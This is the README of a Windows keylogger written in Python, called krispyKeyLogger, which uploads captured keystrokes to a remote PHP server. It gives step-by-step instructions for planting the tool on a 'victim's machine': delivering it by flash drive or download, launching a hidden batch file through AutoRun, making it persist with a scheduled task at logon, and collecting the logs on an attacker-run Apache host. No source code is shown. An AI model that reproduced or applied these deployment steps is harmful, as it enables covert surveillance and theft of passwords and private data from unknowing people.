# krispyKeyLogger
windows based key logger written in python3 with pushing logs to remote server.

Requirements
1) Python-3.7.0-amd64.exe
2) pyHook-1.5.1-cp37-cp37m-win64.whl
3) pywin32-223.1-cp37-cp37m-win64.whl
4) Internet connection on victim's machine (for uploading logs-optional)
5) A web host running apach2 on the internet (to download logs from victim's machine)


# Steps to setup krispyKeyLogger on victim's machine
1) download this repo and also download python-3.7.0-amd64.exe from https://www.python.org/downloads/ and save it to victim directory
2) you can carry victim directory in a removeable flash drive or download from web.
3) change remote server path where you want to upload logs (optinal).You can also change the path where the python script will be stored,then you need to also change python script location on task schedule command.
4) execute hiddencmd.bat either by AutoRun or manually
  you will be requied to give administrative privileges to make a windows task schedule to execute krispyKeyLogger at logon,if privileges are not given the task will not be created.
5) the deploy.bat fill will isntall python and two other python packages present in this directory.
6) deploy.bat will also create an instance of krispyKeyLogger for current session.

# Steps to setup krispyKeyLogger on server - remote access logs (optional)
1) download server side directory to an apache2 server make sure that you can execute the php from a domain or ip address
  eg. http://example.com/upload.php or http://127.0.0.1/upload.php
2) change "Krispy_logs" directory location or create a directory any where you want.just make sure you have write permission on that directory.default location is "/home/user/Krispy_logs/" where 'user' is the username for current user.change it accordingly on debian based system.


# known bugs and other hints
1) reinstalls python on default directory.untested on different environments.tested on fresh install of windows.
2) logs and init2z.pyw are saved in plain text.
3) logs are sent over the internet in plain text without SSL.
4) sometimes windows task scheduler do not starts the task on logon
5) onstart task does not work for some reason onlogon works fine in task scheduler
